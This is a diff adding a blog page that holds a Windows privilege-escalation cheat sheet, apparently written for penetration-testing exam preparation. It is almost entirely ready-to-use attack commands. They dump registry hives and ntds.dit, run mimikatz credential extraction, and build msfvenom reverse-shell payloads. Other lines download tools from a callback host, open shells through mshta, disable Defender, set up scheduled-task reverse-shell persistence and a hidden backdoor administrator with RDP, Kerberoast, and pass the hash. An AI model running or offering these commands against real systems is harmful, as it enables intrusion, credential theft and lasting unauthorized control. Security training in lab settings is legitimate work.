+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span> <span class="nv">Windows</span> <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">zc <span class="p">|</span> :s/<span class="nv">$user</span>/&lt;user&gt;/g <span class="p">|</span> :norm zo<span class="sb">``</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">privs</span> <span class="o">=</span>-<span class="o">=</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Impersonate -&gt; Potato  <span class="c1">## free system</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Backup:  <span class="c1">## can save registry </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">reg save hklm<span class="se">\s</span>am C:<span class="se">\w</span>indows<span class="se">\t</span>emp<span class="se">\S</span>AM
+</span></span><span class="line"><span class="cl">reg save hklm<span class="se">\s</span>ystem C:<span class="se">\w</span>indows<span class="se">\t</span>emp<span class="se">\S</span>YSTEM
+</span></span><span class="line"><span class="cl">reg save hklm<span class="se">\s</span>ecurity C:<span class="se">\w</span>indows<span class="se">\t</span>emp<span class="se">\S</span>ECURITY
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## if on a domain, need ntds.dit</span>
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> dsh file
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> context persistent nowriters
+</span></span><span class="line"><span class="cl">add volume c: <span class="nb">alias</span> <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">create
+</span></span><span class="line"><span class="cl">expose %test% z:
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">unix2dos <span class="nv">$dsh_file</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// on windows target
+</span></span><span class="line"><span class="cl">diskshadow /s <span class="nv">$dsh_file</span>
+</span></span><span class="line"><span class="cl">robocopy /b Z:<span class="se">\w</span>indows<span class="se">\n</span>tds . ntds.dit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">awareness</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">whoami /priv
+</span></span><span class="line"><span class="cl">dir c:<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>dir <span class="s2">&#34;C:\Program Files&#34;</span>
+</span></span><span class="line"><span class="cl">dir <span class="s2">&#34;C:\Program Files (x86)&#34;</span>
+</span></span><span class="line"><span class="cl">!! look <span class="k">for</span> non-standard bins !!
+</span></span><span class="line"><span class="cl"><span class="c1">## if putty</span>
+</span></span><span class="line"><span class="cl">reg query HKCU<span class="se">\S</span>oftware<span class="se">\S</span>imonTatham<span class="se">\P</span>uTTY /s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dir <span class="s2">&#34;C:\Users&#34;</span>
+</span></span><span class="line"><span class="cl">dir <span class="s2">&#34;C:\Users\$user&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## mimikatz</span>
+</span></span><span class="line"><span class="cl">cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$host</span>/mimikatz.exe -OutFile mimikatz.exe
+</span></span><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;token::elevate&#34;</span> <span class="s2">&#34;sekurlsa::logonpasswords&#34;</span> <span class="s2">&#34;lsadump::lsa /inject&#34;</span> <span class="s2">&#34;lsadump::sam&#34;</span> <span class="s2">&#34;lsadump::cache&#34;</span> <span class="s2">&#34;sekurlsa::ekeys&#34;</span> <span class="s2">&#34;exit&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">powershell
+</span></span><span class="line"><span class="cl">Get-ItemProperty <span class="s2">&#34;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="p">|</span> <span class="k">select</span> displayname
+</span></span><span class="line"><span class="cl">Get-ItemProperty <span class="s2">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="p">|</span> <span class="k">select</span> displayname
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Get-ChildItem -Path C:<span class="se">\ </span>-Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+</span></span><span class="line"><span class="cl">Get-ChildItem -Path C:<span class="se">\U</span>sers<span class="se">\ </span>-Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Get-CimInstance -Classname win32_service <span class="p">|</span> Select Name,State,PathName <span class="p">|</span> Where-Object <span class="o">{</span><span class="nv">$_</span>.State -like <span class="s1">&#39;Running&#39;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">Get-CimInstance -ClassName win32_service <span class="p">|</span> Select Name, StartMode <span class="p">|</span> Where-Object <span class="o">{</span><span class="nv">$_</span>.Name -like <span class="s1">&#39;$service_name&#39;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">common</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">zc <span class="p">|</span> :%s/<span class="nv">$cb_ip</span>/&lt;cb_ip&gt;/g <span class="p">|</span> :%s/<span class="nv">$cb_port</span>/&lt;cb_port&gt;/g <span class="p">|</span> :norm zo<span class="sb">``</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cp ~/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe .
+</span></span><span class="line"><span class="cl">cp ~/tools/SharpCollection/NetFramework_4.7_Any/SweetPotato.exe .
+</span></span><span class="line"><span class="cl">cp ~/tools/SharpCollection/NetFramework_4.7_Any/SharpHound.exe .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msfvenom -p windows/x65/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$cb_ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$cb_port</span> -f exe -o reverse.exe
+</span></span><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$cb_ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$cb_port</span> -f hta-psh -o shell.hta
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$cb_ip</span>/Rubeus.exe -OutFile Rubeus.exe
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$cb_ip</span>/SweetPotato.exe -OutFile SweetPotato.exe
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$cb_ip</span>/mimikatz.exe -OutFile mimikatz.exe
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$cb_ip</span>/SharpHound.exe -OutFile SharpHound.exe
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$cb_ip</span>/winPEAS.exe -OutFile winPEAS.exe
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$cb_ip</span>/reverse.exe -OutFile reverse.exe
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$cb_ip</span>/PrintSpoofer64.exe -OutFile spoofer.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="nv">$cb_port</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## reverse shell with hta</span>
+</span></span><span class="line"><span class="cl">mshta http://<span class="nv">$cb_ip</span>/shell.hta
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## sweet potato execution</span>
+</span></span><span class="line"><span class="cl">cmd /c <span class="s2">&#34;SweetPotato.exe -p &#39;reverse.exe&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">cmd /c <span class="s2">&#34;spoofer.exe -c reverse.exe&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Rubeus.exe kerberoast /outfile:hashes.kerb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SharpHound.exe -c all --outputdirectory C:<span class="se">\w</span>indows<span class="se">\t</span>emp --outputprefix <span class="s2">&#34;OSCP&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## start bloodhound</span>
+</span></span><span class="line"><span class="cl">sudo neo4j start
+</span></span><span class="line"><span class="cl">http://localhost:7474
+</span></span><span class="line"><span class="cl">neo4j	/	neo4j
+</span></span><span class="line"><span class="cl">bloodhound
+</span></span><span class="line"><span class="cl"><span class="c1">## upload data, select zip from target</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Disable AV
+</span></span><span class="line"><span class="cl">powershell -command <span class="s1">&#39;Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">powershell -command <span class="s1">&#39;Add-MpPreference -ExclusionPath &#34;c:\temp&#34; -ExclusionProcess &#34;c:\temp\yourstuffs.exe&#34;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> Persistence / <span class="nv">RDP</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">schtasks /ru SYSTEM /create /sc MINUTE /mo <span class="m">5</span>  /tn <span class="s1">&#39;revshell&#39;</span> /tr <span class="s1">&#39;$rev_shell&#39;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">net user /add penuser HackedPass1! <span class="o">&amp;&amp;</span> net localgroup administrators penuser /add <span class="p">&amp;</span> net localgroup <span class="s2">&#34;Remote Desktop Users&#34;</span> penuser /add <span class="p">&amp;</span> netsh advfirewall firewall <span class="nb">set</span> rule <span class="nv">group</span><span class="o">=</span><span class="s2">&#34;remote desktop&#34;</span> new <span class="nv">enable</span><span class="o">=</span>Yes <span class="p">&amp;</span> reg add HKEY_LOCAL_MACHINE<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsNT<span class="se">\C</span>urrentVersion<span class="se">\W</span>inlogon<span class="se">\S</span>pecialAccounts<span class="se">\U</span>serList /v penuser /t REG_DWORD /d <span class="m">0</span> <span class="p">&amp;</span> reg add <span class="s2">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v TSEnabled /t REG_DWORD /d <span class="m">1</span> /f <span class="p">&amp;</span> sc config TermService <span class="nv">start</span><span class="o">=</span> auto <span class="p">&amp;</span> reg add <span class="s2">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="m">0</span> /f
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## checks</span>
+</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span>
+</span></span><span class="line"><span class="cl">netstat -ano
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">net user administrator HackedPass1!                                                                                                                                                                                                                                                                                         
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=</span>-<span class="o">=</span> <span class="nv">winpeas</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">powershell
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$my_up</span>/winPEASx64.exe -outfile winPEAS.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=</span>-<span class="o">=</span> <span class="nv">powerup</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+</span></span><span class="line"><span class="cl">iwr -uri http://<span class="nv">$host</span>/PowerUp.ps1 -OutFile PowerUp.ps1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">powershel -ep bypass
+</span></span><span class="line"><span class="cl">. .<span class="se">\P</span>owerUp.ps1
+</span></span><span class="line"><span class="cl">Invoke-PrivescAudit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">hashes</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// <span class="k">if</span> <span class="nb">local</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-secretsdump -system <span class="nv">$system</span> -sam <span class="nv">$sam</span> LOCAL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// use to pass the <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl">impacket-psexec 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span> <span class="nv">Flags</span> <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! MUST TAKE A SCREENSHOT !!
+</span></span><span class="line"><span class="cl">!! MUST BE IN A SHELL !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=</span>-<span class="o">=</span> <span class="nv">Lin</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">id<span class="p">;</span> ip a sh<span class="p">;</span> cat <span class="nv">$flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=</span>-<span class="o">=</span> <span class="nv">Win</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">whoami<span class="p">;</span> ipconfig<span class="p">;</span> cat <span class="nv">$flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! MUST TAKE A SCREENSHOT !!
+</span></span><span class="line"><span class="cl">!! MUST BE IN A SHELL !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</div>
+
+            </main>
+        </div>
+        <footer class="footer">
+    &copy; 2025 d0xFF, Built with
+    <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+    <a href="https://github.com/akopdev/hugo-theme-rose-pine" class="footerLink">Rose Pine</a> theme
+</footer>
+
+
+    
+    <script src="/js/copy-code.min.js"></script>
+
+
+    </div>
+</body>
+</html>
